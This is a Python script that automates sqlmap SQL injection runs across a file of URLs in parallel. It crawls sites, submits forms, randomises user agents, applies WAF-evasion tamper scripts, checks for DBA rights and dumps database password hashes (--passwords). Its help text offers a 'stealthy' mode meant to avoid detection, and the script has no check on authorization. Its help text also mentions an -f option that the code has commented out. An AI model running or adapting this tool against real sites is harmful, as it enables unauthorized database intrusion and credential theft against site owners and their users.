#!/usr/bin/env python3
import subprocess
import argparse
import os
import sys
import datetime
import multiprocessing

MSSQL_TAMPERS = ["between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes"]

# Function to display the help menu
def show_help():
    print("Original by https://github.com/d3ndr1t30x/run_sqlmap")
    print("NEw Version wabafet In Python More Features Hats off to this guy")
    print("Usage: {} [options] <url_list_file>".format(sys.argv[0]))
    print()
    print("Options:")
    print("  -h, --help             Display this help message.")
    print("  -d, --delay            Set the SQLMap request delay in seconds (default: 10).")
    print("  -t, --threads          Set the SQLMap number of threads (default: 1).")
    #print("  -f, --safe-freq        Set the safe request frequency for SQLMap (default: 1).")
    print("  -T, --time-sec         Set the SQLMap timeout for each request in seconds (default: 10).")
    print()
    print("Arguments:")
    print("  url_list_file          File containing full URLs for testing.")
    print()
    print("Examples:")
    print("  Stealthy Scan:")
    print("    {} -d 10 -t 1 -f 1 -T 10 urls.txt".format(sys.argv[0]))
    print("    Description: Uses low risk and level, single thread, and high delays to avoid detection.")
    print()
    print("  Aggressive Scan:")
    print("    {} -d 1 -t 10 -f 100 -T 5 urls.txt".format(sys.argv[0]))
    print("    Description: Uses higher levels of testing, multiple threads, and minimal delays for thorough testing.")
    print()
    print("  Balanced Scan:")
    print("    {} -d 5 -t 5 -f 50 -T 10 urls.txt".format(sys.argv[0]))
    print("    Description: A balanced approach between stealthy and aggressive scanning.")
    print()
    print("Example:")
    print("  {} -d 15 -t 1 -f 2 -T 15 urls.txt".format(sys.argv[0]))

# Function to handle script exit and cleanup
def cleanup():
    print("\nTerminating script...")
    sys.exit(0)

# Default SQLMap options for stealth mode
delay = 10
threads = 5
time_sec = 10

# Parse command-line arguments
parser = argparse.ArgumentParser(description="SQLMap Automation Script", conflict_handler='resolve')
parser.add_argument("url_list_file", metavar="url_list_file", type=str, help="File containing full URLs for testing.")
parser.add_argument("-d", "--delay", type=int, default=delay, help="Set the SQLMap request delay in seconds (default: 10).")
parser.add_argument("-t", "--threads", type=int, default=threads, help="Set the SQLMap number of threads (default: 1).")
#parser.add_argument("-f", "--safe-freq", type=int, default=safe_freq, help="Set the safe request frequency for SQLMap (default: 1).")
parser.add_argument("-T", "--time-sec", type=int, default=time_sec, help="Set the SQLMap timeout for each request in seconds (default: 10).")
parser.add_argument("-H", "--show-help", action="store_true", help="Display this help message.")
args = parser.parse_args()

if args.show_help:
    show_help()
    sys.exit(0)

url_list_file = args.url_list_file
delay = args.delay
threads = args.threads
#safe_freq = args.safe_freq
time_sec = args.time_sec

# Combined results file with timestamp
timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
combined_results = "combined_results_{}.txt".format(timestamp)

# Prompt for POST data and cookie if needed

# Read URLs from file
with open(url_list_file, 'r') as file:
    urls = file.read().splitlines()

def run_sqlmap(url):
    # Output filename based on URL path with timestamp
    output_file = "{}_{}.sqlmap.out".format(''.join(c if c.isalnum() else '_' for c in url), timestamp)

    # Construct SQLMap command
    command = [
        "sqlmap",
        "-u", url,
        "--crawl",
        "--level", "2",
        "--risk", "2",
        "--random-agent",
        "--delay", str(delay),
        "--threads", str(threads),
        #"--safe-freq", str(safe_freq),
        "--time-sec", str(time_sec),
        "-o", output_file,
        "--batch",
        "--is-dba",
        "--passwords",
        "--tamper","space2mssqlblank",
        "--forms"
    ]

    # Add POST data and cookie if provided
    
    # Execute SQLMap command
    subprocess.run(command)

    # Append results to combined results file
    with open(combined_results, 'a') as results_file:
        results_file.write("==== Results for URL: {} ====\n".format(url))
        with open(output_file, 'r') as output:
            results_file.write(output.read() + "\n\n")

# Run SQLMap for each URL concurrently
with multiprocessing.Pool(processes=6) as pool:
    pool.map(run_sqlmap, urls)

print("Combined results have been saved to {}.".format(combined_results))
